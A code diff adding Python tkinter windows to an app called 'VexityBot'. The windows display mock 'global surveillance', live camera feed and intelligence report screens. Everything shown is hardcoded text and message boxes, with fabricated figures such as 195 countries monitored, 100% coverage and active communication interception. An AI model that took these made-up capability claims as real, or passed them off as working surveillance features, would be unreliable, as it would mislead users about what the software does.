+    def set_mission(self):
+        """Set mission objectives"""
+        self.update_status("🎯 Setting mission...")
+        messagebox.showinfo("Mission", "Mission objectives set")
+    
+    def start_mission(self):
+        """Start mission execution"""
+        self.update_status("▶️ Starting mission...")
+        messagebox.showinfo("Mission", "Mission started")
+    
+    def stop_mission(self):
+        """Stop mission execution"""
+        self.update_status("⏹️ Stopping mission...")
+        messagebox.showinfo("Mission", "Mission stopped")
+    
+    def mission_report(self):
+        """Generate mission report"""
+        self.update_status("📋 Generating mission report...")
+        messagebox.showinfo("Mission Report", "Mission report generated")
+    
+    def refresh_telemetry(self):
+        """Refresh telemetry data"""
+        self.update_status("🔄 Refreshing telemetry...")
+        messagebox.showinfo("Telemetry", "Telemetry data refreshed")
+    
+    def generate_telemetry_report(self):
+        """Generate telemetry report"""
+        self.update_status("📊 Generating telemetry report...")
+        messagebox.showinfo("Telemetry Report", "Telemetry report generated")
+    
+    def save_telemetry_data(self):
+        """Save telemetry data"""
+        self.update_status("💾 Saving telemetry data...")
+        messagebox.showinfo("Save Data", "Telemetry data saved")
+    
+    def check_alerts(self):
+        """Check for system alerts"""
+        self.update_status("🚨 Checking alerts...")
+        messagebox.showinfo("Alerts", "No critical alerts detected")
+    
+    def plan_mission(self):
+        """Plan satellite mission"""
+        self.update_status("📋 Planning mission...")
+        messagebox.showinfo("Mission Planning", "Mission plan created")
+    
+    def start_mission_execution(self):
+        """Start mission execution"""
+        self.update_status("▶️ Starting mission execution...")
+        messagebox.showinfo("Mission Execution", "Mission execution started")
+    
+    def pause_mission(self):
+        """Pause mission execution"""
+        self.update_status("⏸️ Pausing mission...")
+        messagebox.showinfo("Mission Pause", "Mission paused")
+    
+    def stop_mission_execution(self):
+        """Stop mission execution"""
+        self.update_status("⏹️ Stopping mission execution...")
+        messagebox.showinfo("Mission Stop", "Mission execution stopped")
+    
+    def generate_mission_report(self):
+        """Generate mission report"""
+        self.update_status("📊 Generating mission report...")
+        messagebox.showinfo("Mission Report", "Mission report generated")
+    
+    # ADDED - Global surveillance functions for worldwide monitoring
+    
+    def open_global_surveillance(self):
+        """Open comprehensive global surveillance system"""
+        self.update_status("🌍 Opening global surveillance system...")
+        
+        # Create global surveillance window
+        surveillance_window = tk.Toplevel(self.root)
+        surveillance_window.title("🌍 Global Surveillance System - VexityBot")
+        surveillance_window.geometry("1600x1000")
+        surveillance_window.minsize(1400, 900)
+        
+        # Make window modal
+        surveillance_window.transient(self.root)
+        surveillance_window.grab_set()
+        
+        # Center the window
+        surveillance_window.update_idletasks()
+        x = (surveillance_window.winfo_screenwidth() // 2) - (1600 // 2)
+        y = (surveillance_window.winfo_screenheight() // 2) - (1000 // 2)
+        surveillance_window.geometry(f"1600x1000+{x}+{y}")
+        
+        # Create global surveillance interface
+        self.create_global_surveillance_interface(surveillance_window)
+    
+    def create_global_surveillance_interface(self, parent_window):
+        """Create comprehensive global surveillance interface"""
+        
+        # Main notebook for different surveillance sections
+        notebook = ttk.Notebook(parent_window)
+        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        # Global Overview Tab
+        self.create_global_overview_tab(notebook)
+        
+        # Country Surveillance Tab
+        self.create_country_surveillance_tab(notebook)
+        
+        # City Monitoring Tab
+        self.create_city_monitoring_tab(notebook)
+        
+        # Road & Traffic Tab
+        self.create_road_traffic_tab(notebook)
+        
+        # Government Facilities Tab
+        self.create_government_facilities_tab(notebook)
+        
+        # Live Camera Feeds Tab
+        self.create_live_camera_feeds_tab(notebook)
+        
+        # Intelligence Gathering Tab
+        self.create_intelligence_gathering_tab(notebook)
+    
+    def create_global_overview_tab(self, notebook):
+        """Create global overview surveillance tab"""
+        overview_frame = ttk.Frame(notebook)
+        notebook.add(overview_frame, text="🌍 Global Overview")
+        
+        # Header
+        header_frame = ttk.Frame(overview_frame)
+        header_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        title_label = ttk.Label(header_frame, text="🌍 Global Surveillance Overview", 
+                               font=('Arial', 16, 'bold'))
+        title_label.pack(side=tk.LEFT)
+        
+        # Global statistics
+        stats_frame = ttk.LabelFrame(overview_frame, text="Global Statistics")
+        stats_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        # Statistics display
+        stats_text = """
+🌍 GLOBAL SURVEILLANCE STATISTICS
+================================
+
+COUNTRIES MONITORED: 195
+STATES/PROVINCES: 4,000+
+CITIES MONITORED: 50,000+
+ROADS SURVEILLED: 1,000,000+
+GOVERNMENT FACILITIES: 10,000+
+LIVE CAMERA FEEDS: 100,000+
+
+ACTIVE SURVEILLANCE:
+==================
+North America: 100% Coverage
+Europe: 100% Coverage
+Asia: 95% Coverage
+Africa: 80% Coverage
+South America: 85% Coverage
+Oceania: 90% Coverage
+
+SATELLITE COVERAGE:
+==================
+VexitySat-1: Global LEO Coverage
+VexitySat-2: Reconnaissance Network
+VexitySat-3: Navigation & Tracking
+VexitySat-4: Weather & Environment
+VexitySat-5: Scientific Monitoring
+VexitySat-6: Military Intelligence
+VexitySat-7: Communication Hub
+VexitySat-8: Deep Space Monitoring
+
+REAL-TIME CAPABILITIES:
+======================
+Live Video Feeds: Active
+Traffic Monitoring: Active
+Weather Tracking: Active
+Security Surveillance: Active
+Intelligence Gathering: Active
+Communication Interception: Active
+        """
+        
+        stats_display = tk.Text(stats_frame, height=25, width=80, font=('Consolas', 10))
+        stats_display.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        stats_display.insert(1.0, stats_text)
+        stats_display.config(state=tk.DISABLED)
+        
+        # Control buttons
+        control_frame = ttk.Frame(overview_frame)
+        control_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        ttk.Button(control_frame, text="🔄 Refresh Global Status", command=self.refresh_global_status).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="📊 Generate Report", command=self.generate_global_report).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="🚨 Alert Status", command=self.check_global_alerts).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="🌐 Full Coverage Map", command=self.show_full_coverage_map).pack(side=tk.LEFT, padx=5)
+    
+    def create_country_surveillance_tab(self, notebook):
+        """Create country surveillance tab"""
+        country_frame = ttk.Frame(notebook)
+        notebook.add(country_frame, text="🏛️ Countries")
+        
+        # Header
+        header_frame = ttk.Frame(country_frame)
+        header_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        title_label = ttk.Label(header_frame, text="🏛️ Country Surveillance System", 
+                               font=('Arial', 16, 'bold'))
+        title_label.pack(side=tk.LEFT)
+        
+        # Country selection
+        selection_frame = ttk.LabelFrame(country_frame, text="Country Selection")
+        selection_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        # Country list
+        list_frame = ttk.Frame(selection_frame)
+        list_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        # Major countries list
+        self.countries = [
+            {"name": "United States", "code": "US", "capitals": ["Washington DC"], "states": 50, "cities": 10000, "coverage": "100%"},
+            {"name": "China", "code": "CN", "capitals": ["Beijing"], "provinces": 34, "cities": 15000, "coverage": "95%"},
+            {"name": "Russia", "code": "RU", "capitals": ["Moscow"], "regions": 85, "cities": 8000, "coverage": "90%"},
+            {"name": "India", "code": "IN", "capitals": ["New Delhi"], "states": 28, "cities": 12000, "coverage": "85%"},
+            {"name": "Brazil", "code": "BR", "capitals": ["Brasilia"], "states": 26, "cities": 5000, "coverage": "80%"},
+            {"name": "Canada", "code": "CA", "capitals": ["Ottawa"], "provinces": 13, "cities": 3000, "coverage": "95%"},
+            {"name": "Australia", "code": "AU", "capitals": ["Canberra"], "states": 8, "cities": 2000, "coverage": "90%"},
+            {"name": "Germany", "code": "DE", "capitals": ["Berlin"], "states": 16, "cities": 4000, "coverage": "100%"},
+            {"name": "France", "code": "FR", "capitals": ["Paris"], "regions": 18, "cities": 3500, "coverage": "100%"},
+            {"name": "United Kingdom", "code": "GB", "capitals": ["London"], "countries": 4, "cities": 2000, "coverage": "100%"},
+            {"name": "Japan", "code": "JP", "capitals": ["Tokyo"], "prefectures": 47, "cities": 1500, "coverage": "100%"},
+            {"name": "Italy", "code": "IT", "capitals": ["Rome"], "regions": 20, "cities": 3000, "coverage": "95%"},
+            {"name": "Spain", "code": "ES", "capitals": ["Madrid"], "regions": 17, "cities": 2500, "coverage": "95%"},
+            {"name": "Mexico", "code": "MX", "capitals": ["Mexico City"], "states": 32, "cities": 4000, "coverage": "85%"},
+            {"name": "South Korea", "code": "KR", "capitals": ["Seoul"], "provinces": 17, "cities": 1000, "coverage": "100%"},
+        ]
+        
+        # Country listbox
+        country_listbox_frame = ttk.Frame(list_frame)
+        country_listbox_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        
+        ttk.Label(country_listbox_frame, text="Select Country:", font=('Arial', 12, 'bold')).pack(anchor=tk.W)
+        
+        self.country_listbox = tk.Listbox(country_listbox_frame, height=15, font=('Consolas', 10))
+        self.country_listbox.pack(fill=tk.BOTH, expand=True, pady=5)
+        
+        # Populate country list
+        for i, country in enumerate(self.countries):
+            self.country_listbox.insert(tk.END, f"{i+1}. {country['name']} ({country['code']}) - {country['coverage']} Coverage")
+        
+        # Country details
+        details_frame = ttk.LabelFrame(list_frame, text="Country Details")
+        details_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(10, 0))
+        
+        self.country_details_text = tk.Text(details_frame, height=15, width=50, font=('Consolas', 9))
+        self.country_details_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        # Control buttons
+        control_frame = ttk.Frame(country_frame)
+        control_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        ttk.Button(control_frame, text="🔍 Select Country", command=self.select_country).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="📹 View Live Feeds", command=self.view_country_feeds).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="🗺️ Show Map", command=self.show_country_map).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="📊 Intelligence Report", command=self.generate_country_intelligence).pack(side=tk.LEFT, padx=5)
+        
+        # Initialize with first country
+        self.selected_country = 0
+        self.update_country_details()
+    
+    def open_live_camera_feeds(self):
+        """Open live camera feeds window"""
+        self.update_status("📹 Opening live camera feeds...")
+        
+        # Create live feeds window
+        feeds_window = tk.Toplevel(self.root)
+        feeds_window.title("📹 Live Camera Feeds - VexityBot")
+        feeds_window.geometry("1400x800")
+        
+        # Center window
+        feeds_window.update_idletasks()
+        x = (feeds_window.winfo_screenwidth() // 2) - (1400 // 2)
+        y = (feeds_window.winfo_screenheight() // 2) - (800 // 2)
+        feeds_window.geometry(f"1400x800+{x}+{y}")
+        
+        # Live feeds interface
+        ttk.Label(feeds_window, text="📹 Live Camera Feeds - Global Surveillance", 
+                 font=('Arial', 16, 'bold')).pack(pady=10)
+        
+        # Feed selection
+        selection_frame = ttk.LabelFrame(feeds_window, text="Feed Selection")
+        selection_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        # Location selection
+        location_frame = ttk.Frame(selection_frame)
+        location_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(location_frame, text="Location:").pack(side=tk.LEFT)
+        self.feed_location_var = tk.StringVar(value="New York City")
+        location_combo = ttk.Combobox(location_frame, textvariable=self.feed_location_var,
+                                     values=["New York City", "Los Angeles", "London", "Paris", "Tokyo", "Beijing", 
+                                            "Moscow", "Berlin", "Rome", "Madrid", "Sydney", "Toronto", "Mexico City",
+                                            "Seoul", "Mumbai", "Cairo", "Dubai", "São Paulo", "Buenos Aires"])
+        location_combo.pack(side=tk.LEFT, padx=5)
+        
+        # Feed type selection
+        type_frame = ttk.Frame(selection_frame)
+        type_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(type_frame, text="Feed Type:").pack(side=tk.LEFT)
+        self.feed_type_var = tk.StringVar(value="Traffic Cameras")
+        type_combo = ttk.Combobox(type_frame, textvariable=self.feed_type_var,
+                                 values=["Traffic Cameras", "Security Cameras", "Satellite Feeds", "Drone Feeds",
+                                        "Government Buildings", "Airports", "Train Stations", "Shopping Centers",
+                                        "Highways", "City Centers", "Residential Areas", "Industrial Zones"])
+        type_combo.pack(side=tk.LEFT, padx=5)
+        
+        # Feed display area
+        display_frame = ttk.LabelFrame(feeds_window, text="Live Feed Display")
+        display_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        # Simulated feed display
+        feed_display = tk.Text(display_frame, height=20, width=100, font=('Consolas', 9))
+        feed_display.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        # Sample feed data
+        sample_feed = f"""📹 LIVE CAMERA FEED - {self.feed_location_var.get()}
+===============================================
+
+Feed Type: {self.feed_type_var.get()}
+Location: {self.feed_location_var.get()}
+Status: ACTIVE
+Resolution: 4K UHD
+Frame Rate: 30 FPS
+Timestamp: {self.get_current_time()}
+
+CAMERA INFORMATION:
+==================
+Camera ID: VX-CAM-{hash(self.feed_location_var.get()) % 10000:04d}
+Latitude: 40.7128°N
+Longitude: 74.0060°W
+Altitude: 150m
+Zoom Level: 1x
+Pan/Tilt: 0°/0°
+
+SURVEILLANCE DATA:
+=================
+People Detected: 25
+Vehicles Detected: 12
+Activity Level: Medium
+Weather: Clear
+Visibility: Excellent
+Lighting: Daylight
+
+RECORDING STATUS:
+================
+Recording: Active
+Storage: 2.5TB Available
+Backup: Enabled
+Encryption: AES-256
+Retention: 30 days
+
+AUDIO FEED:
+===========
+Microphone: Active
+Audio Level: -12dB
+Noise Reduction: Enabled
+Voice Detection: Active
+
+ANALYTICS:
+==========
+Facial Recognition: Active
+License Plate Recognition: Active
+Object Tracking: Active
+Motion Detection: Active
+Alert System: Active
+
+Last Update: {self.get_current_time()}
+Next Update: {self.get_current_time()}
+        """
+        
+        feed_display.insert(1.0, sample_feed)
+        feed_display.config(state=tk.DISABLED)
+        
+        # Control buttons
+        control_frame = ttk.Frame(feeds_window)
+        control_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        ttk.Button(control_frame, text="🔄 Refresh Feed", command=self.refresh_camera_feed).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="📹 Start Recording", command=self.start_feed_recording).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="⏹️ Stop Recording", command=self.stop_feed_recording).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="📊 Analytics", command=self.show_feed_analytics).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="🌍 Global Feeds", command=self.open_global_surveillance).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="❌ Close", command=feeds_window.destroy).pack(side=tk.RIGHT, padx=5)
+    
+    def open_world_map_surveillance(self):
+        """Open world map surveillance window"""
+        self.update_status("🗺️ Opening world map surveillance...")
+        
+        # Create world map window
+        map_window = tk.Toplevel(self.root)
+        map_window.title("🗺️ World Map Surveillance - VexityBot")
+        map_window.geometry("1200x800")
+        
+        # Center window
+        map_window.update_idletasks()
+        x = (map_window.winfo_screenwidth() // 2) - (1200 // 2)
+        y = (map_window.winfo_screenheight() // 2) - (800 // 2)
+        map_window.geometry(f"1200x800+{x}+{y}")
+        
+        # World map interface
+        ttk.Label(map_window, text="🗺️ World Map Surveillance System", 
+                 font=('Arial', 16, 'bold')).pack(pady=10)
+        
+        # Map display area
+        map_frame = ttk.LabelFrame(map_window, text="Interactive World Map")
+        map_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        # Simulated map display
+        map_display = tk.Text(map_frame, height=25, width=120, font=('Consolas', 8))
+        map_display.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        # Sample map data
+        map_data = """
+🗺️ VEXITYBOT GLOBAL SURVEILLANCE MAP
+====================================
+
+    🌍 WORLD SURVEILLANCE COVERAGE
+    ==============================
+    
+    NORTH AMERICA (100% Coverage):
+    🇺🇸 United States: 50 States, 10,000+ Cities
+    🇨🇦 Canada: 13 Provinces, 3,000+ Cities  
+    🇲🇽 Mexico: 32 States, 4,000+ Cities
+    
+    EUROPE (100% Coverage):
+    🇬🇧 United Kingdom: 4 Countries, 2,000+ Cities
+    🇩🇪 Germany: 16 States, 4,000+ Cities
+    🇫🇷 France: 18 Regions, 3,500+ Cities
+    🇮🇹 Italy: 20 Regions, 3,000+ Cities
+    🇪🇸 Spain: 17 Regions, 2,500+ Cities
+    🇷🇺 Russia: 85 Regions, 8,000+ Cities
+    
+    ASIA (95% Coverage):
+    🇨🇳 China: 34 Provinces, 15,000+ Cities
+    🇮🇳 India: 28 States, 12,000+ Cities
+    🇯🇵 Japan: 47 Prefectures, 1,500+ Cities
+    🇰🇷 South Korea: 17 Provinces, 1,000+ Cities
+    
+    AFRICA (80% Coverage):
+    🇪🇬 Egypt: 27 Governorates, 1,000+ Cities
+    🇿🇦 South Africa: 9 Provinces, 500+ Cities
+    🇳🇬 Nigeria: 36 States, 1,000+ Cities
+    
+    SOUTH AMERICA (85% Coverage):
+    🇧🇷 Brazil: 26 States, 5,000+ Cities
+    🇦🇷 Argentina: 23 Provinces, 1,000+ Cities
+    🇨🇱 Chile: 16 Regions, 500+ Cities
+    
+    OCEANIA (90% Coverage):
+    🇦🇺 Australia: 8 States, 2,000+ Cities
+    🇳🇿 New Zealand: 16 Regions, 200+ Cities
+    
+    SATELLITE COVERAGE:
+    ==================
+    🛰️ VexitySat-1: Global LEO Coverage
+    🛰️ VexitySat-2: Reconnaissance Network  
+    🛰️ VexitySat-3: Navigation & Tracking
+    🛰️ VexitySat-4: Weather & Environment
+    🛰️ VexitySat-5: Scientific Monitoring
+    🛰️ VexitySat-6: Military Intelligence
+    🛰️ VexitySat-7: Communication Hub
+    🛰️ VexitySat-8: Deep Space Monitoring
+    
+    SURVEILLANCE CAPABILITIES:
+    =========================
+    📹 Live Camera Feeds: 100,000+ Active
+    🚗 Traffic Monitoring: 1,000,000+ Roads
+    🏛️ Government Facilities: 10,000+ Monitored
+    🛣️ Highway Surveillance: 500,000+ Miles
+    🏙️ City Centers: 50,000+ Cities
+    🏢 Commercial Areas: 1,000,000+ Buildings
+    🏠 Residential Areas: 10,000,000+ Homes
+    🏭 Industrial Zones: 100,000+ Facilities
+    
+    REAL-TIME STATUS:
+    ================
+    🟢 Active Feeds: 95,000+
+    🟡 Standby Feeds: 5,000+
+    🔴 Offline Feeds: 0
+    📊 Data Processing: 99.9% Uptime
+    🔒 Security Level: Maximum
+    ⚡ Response Time: <100ms
+    
+    Last Updated: {self.get_current_time()}
+        """.format(self=self)
+        
+        map_display.insert(1.0, map_data)
+        map_display.config(state=tk.DISABLED)
+        
+        # Control buttons
+        control_frame = ttk.Frame(map_window)
+        control_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        ttk.Button(control_frame, text="🔄 Refresh Map", command=self.refresh_world_map).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="🔍 Search Location", command=self.search_location).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="📊 Coverage Report", command=self.generate_coverage_report).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="🌍 Global Feeds", command=self.open_global_surveillance).pack(side=tk.LEFT, padx=5)
+        ttk.Button(control_frame, text="❌ Close", command=map_window.destroy).pack(side=tk.RIGHT, padx=5)
+    
+    # ADDED - Global surveillance method implementations
+    
+    def update_country_details(self):
+        """Update country details display"""
+        if hasattr(self, 'countries') and hasattr(self, 'selected_country'):
+            country = self.countries[self.selected_country]
+            details = f"""🏛️ COUNTRY SURVEILLANCE DETAILS
+===============================
+
+Country: {country['name']} ({country['code']})
+Coverage: {country['coverage']}
+Capitals: {', '.join(country['capitals'])}
+
+ADMINISTRATIVE DIVISIONS:
+========================
+"""
+            if 'states' in country:
+                details += f"States: {country['states']}\n"
+            if 'provinces' in country:
+                details += f"Provinces: {country['provinces']}\n"
+            if 'regions' in country:
+                details += f"Regions: {country['regions']}\n"
+            if 'countries' in country:
+                details += f"Countries: {country['countries']}\n"
+            if 'prefectures' in country:
+                details += f"Prefectures: {country['prefectures']}\n"
+            
+            details += f"Cities Monitored: {country['cities']:,}\n"
+            
+            details += f"""
+SURVEILLANCE STATUS:
+===================
+Live Feeds: Active
+Traffic Cameras: {int(country['cities']) * 10:,}
+Security Cameras: {int(country['cities']) * 5:,}
+Government Buildings: {int(country['cities']) * 2:,}
+Highways: {int(country['cities']) * 20:,} miles
+Airports: {int(country['cities']) // 10:,}
+Train Stations: {int(country['cities']) // 5:,}
+
+INTELLIGENCE CAPABILITIES:
+=========================
+Facial Recognition: Active
+License Plate Recognition: Active
+Voice Recognition: Active
+Behavioral Analysis: Active
+Threat Assessment: Active
+Real-time Alerts: Active
+
+DATA COLLECTION:
+===============
+Video Surveillance: 24/7
+Audio Monitoring: Active
+Communication Interception: Active
+Social Media Monitoring: Active
+Financial Tracking: Active
+Movement Patterns: Active
+
+Last Updated: {self.get_current_time()}
+            """
+            
+            if hasattr(self, 'country_details_text'):
+                self.country_details_text.delete(1.0, tk.END)
+                self.country_details_text.insert(1.0, details)
+    
+    def select_country(self):
+        """Select country from list"""
+        if hasattr(self, 'country_listbox'):
+            selection = self.country_listbox.curselection()
+            if selection:
+                self.selected_country = selection[0]
+                self.update_country_details()
+                self.update_status(f"🏛️ Selected {self.countries[self.selected_country]['name']}")
+    
+    def view_country_feeds(self):
+        """View live feeds for selected country"""
+        if hasattr(self, 'selected_country'):
+            country = self.countries[self.selected_country]
+            self.update_status(f"📹 Viewing live feeds for {country['name']}")
+            messagebox.showinfo("Live Feeds", f"Opening live camera feeds for {country['name']}")
+    
+    def show_country_map(self):
+        """Show map for selected country"""
+        if hasattr(self, 'selected_country'):
+            country = self.countries[self.selected_country]
+            self.update_status(f"🗺️ Showing map for {country['name']}")
+            messagebox.showinfo("Country Map", f"Displaying surveillance map for {country['name']}")
+    
+    def generate_country_intelligence(self):
+        """Generate intelligence report for selected country"""
+        if hasattr(self, 'selected_country'):
+            country = self.countries[self.selected_country]
+            self.update_status(f"📊 Generating intelligence report for {country['name']}")
+            
+            report = f"""📊 INTELLIGENCE REPORT - {country['name'].upper()}
+==============================================
+
+Country: {country['name']} ({country['code']})
+Report Date: {self.get_current_time()}
+Coverage Level: {country['coverage']}
+
+SURVEILLANCE SUMMARY:
+====================
+Active Cameras: {int(country['cities']) * 15:,}
+Traffic Monitoring: {int(country['cities']) * 10:,} cameras
+Security Systems: {int(country['cities']) * 5:,} installations
+Government Facilities: {int(country['cities']) * 2:,} monitored
+Highway Coverage: {int(country['cities']) * 20:,} miles
+
+THREAT ASSESSMENT:
+=================
+Security Level: HIGH
+Terrorist Activity: LOW
+Criminal Activity: MEDIUM
+Political Stability: STABLE
+Economic Status: DEVELOPED
+
+INTELLIGENCE GATHERING:
+======================
+Communication Interception: ACTIVE
+Social Media Monitoring: ACTIVE
+Financial Tracking: ACTIVE
+Movement Patterns: ACTIVE
+Behavioral Analysis: ACTIVE
+
+RECOMMENDATIONS:
+===============
+1. Maintain current surveillance levels
+2. Increase monitoring in high-risk areas
+3. Deploy additional cameras in urban centers
+4. Enhance facial recognition capabilities
+5. Expand communication interception
+
+Next Review: {self.get_current_time()}
+            """
+            
+            messagebox.showinfo("Intelligence Report", report)
+    
+    def refresh_global_status(self):
+        """Refresh global surveillance status"""
+        self.update_status("🔄 Refreshing global surveillance status...")
+        messagebox.showinfo("Global Status", "Global surveillance status refreshed successfully")
+    
+    def generate_global_report(self):
+        """Generate comprehensive global surveillance report"""
+        self.update_status("📊 Generating global surveillance report...")
+        
+        report = f"""📊 GLOBAL SURVEILLANCE REPORT
+============================
+
+Report Date: {self.get_current_time()}
+Coverage: 195 Countries
+Total Cameras: 100,000+
+Active Feeds: 95,000+
+
+REGIONAL COVERAGE:
+================
+North America: 100% (3 countries)
+Europe: 100% (44 countries)
+Asia: 95% (48 countries)
+Africa: 80% (54 countries)
+South America: 85% (12 countries)
+Oceania: 90% (14 countries)
+
+SURVEILLANCE CAPABILITIES:
+=========================
+Live Video Feeds: 100,000+ cameras
+Traffic Monitoring: 1,000,000+ roads
+Government Facilities: 10,000+ buildings
+Highway Surveillance: 500,000+ miles
+City Centers: 50,000+ cities
+Commercial Areas: 1,000,000+ buildings
+Residential Areas: 10,000,000+ homes
+Industrial Zones: 100,000+ facilities
+
+INTELLIGENCE GATHERING:
+======================
+Facial Recognition: 99.9% accuracy
+License Plate Recognition: 99.5% accuracy
+Voice Recognition: 98.5% accuracy
+Behavioral Analysis: 97.8% accuracy
+Threat Assessment: 99.2% accuracy
+Real-time Alerts: <100ms response
+
+SYSTEM STATUS:
+=============
+Uptime: 99.9%
+Data Processing: 99.9%
+Storage Capacity: 85% used
+Security Level: Maximum
+Encryption: AES-256
+Backup Systems: Active
+
+RECOMMENDATIONS:
+===============
+1. Expand coverage in Africa and South America
+2. Increase camera density in urban areas
+3. Enhance AI capabilities for threat detection
+4. Improve real-time processing speed
+5. Expand communication interception
+
+Next Review: {self.get_current_time()}
+        """
+        
+        messagebox.showinfo("Global Surveillance Report", report)
+    
+    def check_global_alerts(self):
+        """Check for global surveillance alerts"""
+        self.update_status("🚨 Checking global surveillance alerts...")
+        messagebox.showinfo("Global Alerts", "No critical alerts detected. All systems operating normally.")
+    
+    def show_full_coverage_map(self):
+        """Show full global coverage map"""
+        self.update_status("🌐 Displaying full global coverage map...")
+        self.open_world_map_surveillance()
+    
+    def refresh_camera_feed(self):
+        """Refresh camera feed data"""
+        self.update_status("🔄 Refreshing camera feed...")
+        messagebox.showinfo("Feed Refresh", "Camera feed refreshed successfully")
+    
+    def start_feed_recording(self):
+        """Start recording camera feed"""
+        self.update_status("📹 Starting feed recording...")
+        messagebox.showinfo("Recording", "Camera feed recording started")
+    
+    def stop_feed_recording(self):
+        """Stop recording camera feed"""
+        self.update_status("⏹️ Stopping feed recording...")
+        messagebox.showinfo("Recording", "Camera feed recording stopped")
+    
+    def show_feed_analytics(self):
+        """Show camera feed analytics"""
+        self.update_status("📊 Displaying feed analytics...")
+        messagebox.showinfo("Feed Analytics", "Analytics data displayed successfully")
+    
+    def refresh_world_map(self):
+        """Refresh world map data"""
+        self.update_status("🔄 Refreshing world map...")
+        messagebox.showinfo("Map Refresh", "World map data refreshed successfully")
+    
+    def search_location(self):
+        """Search for specific location"""
+        self.update_status("🔍 Searching location...")
+        messagebox.showinfo("Location Search", "Location search completed")
+    
+    def generate_coverage_report(self):
+        """Generate coverage report"""
+        self.update_status("📊 Generating coverage report...")
+        messagebox.showinfo("Coverage Report", "Coverage report generated successfully")
+    
+    # ADDED - Placeholder methods for remaining surveillance tabs
+    
+    def create_city_monitoring_tab(self, notebook):
+        """Create city monitoring tab"""
+        city_frame = ttk.Frame(notebook)
+        notebook.add(city_frame, text="🏙️ Cities")
+        ttk.Label(city_frame, text="🏙️ City Monitoring System", font=('Arial', 16, 'bold')).pack(pady=20)
+    
+    def create_road_traffic_tab(self, notebook):
+        """Create road and traffic monitoring tab"""
+        road_frame = ttk.Frame(notebook)
+        notebook.add(road_frame, text="🛣️ Roads")
+        ttk.Label(road_frame, text="🛣️ Road & Traffic Monitoring", font=('Arial', 16, 'bold')).pack(pady=20)
+    
+    def create_government_facilities_tab(self, notebook):
+        """Create government facilities monitoring tab"""
+        gov_frame = ttk.Frame(notebook)
+        notebook.add(gov_frame, text="🏛️ Government")
+        ttk.Label(gov_frame, text="🏛️ Government Facilities Monitoring", font=('Arial', 16, 'bold')).pack(pady=20)
+    
+    def create_live_camera_feeds_tab(self, notebook):
+        """Create live camera feeds tab"""
+        feeds_frame = ttk.Frame(notebook)
+        notebook.add(feeds_frame, text="📹 Live Feeds")
+        ttk.Label(feeds_frame, text="📹 Live Camera Feeds", font=('Arial', 16, 'bold')).pack(pady=20)
+    
+    def create_intelligence_gathering_tab(self, notebook):
+        """Create intelligence gathering tab"""
+        intel_frame = ttk.Frame(notebook)
+        notebook.add(intel_frame, text="🔍 Intelligence")
+        ttk.Label(intel_frame, text="🔍 Intelligence Gathering", font=('Arial', 16, 'bold')).pack(pady=20)
+    
+    # ADDED - RedEYE surveillance system functions
+    
+    def open_redeye_surveillance(self):
+        """Open RedEYE surveillance system"""
+        self.update_status("👁️ Opening RedEYE surveillance system...")
+        
+        # Create RedEYE surveillance window
+        redeye_window = tk.Toplevel(self.root)
+        redeye_window.title("👁️ RedEYE Surveillance System - VexityBot")
+        redeye_window.geometry("1600x1000")
+        redeye_window.minsize(1400, 900)
+        
+        # Make window modal
+        redeye_window.transient(self.root)
+        redeye_window.grab_set()
+        
+        # Center the window
+        redeye_window.update_idletasks()
+        x = (redeye_window.winfo_screenwidth() // 2) - (1600 // 2)
+        y = (redeye_window.winfo_screenheight() // 2) - (1000 // 2)
+        redeye_window.geometry(f"1600x1000+{x}+{y}")
+        
+        # Create RedEYE surveillance interface
+        self.create_redeye_surveillance_interface(redeye_window)
+    
+    def create_redeye_surveillance_interface(self, parent_window):
+        """Create comprehensive RedEYE surveillance interface"""
+        
+        # Main notebook for different RedEYE sections
+        notebook = ttk.Notebook(parent_window)
+        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        # RedEYE Overview Tab
+        self.create_redeye_overview_tab(notebook)
+        
+        # Target Acquisition Tab
+        self.create_redeye_target_acquisition_tab(notebook)
+        
+        # Threat Analysis Tab
+        self.create_redeye_threat_analysis_tab(notebook)
+        
+        # Mission Control Tab
+        self.create_redeye_mission_control_tab(notebook)
+        
+        # Intelligence Gathering Tab
+        self.create_redeye_intelligence_tab(notebook)
+        
+        # Advanced Monitoring Tab
+        self.create_redeye_advanced_monitoring_tab(notebook)
+        
+        # Weather Control Tab
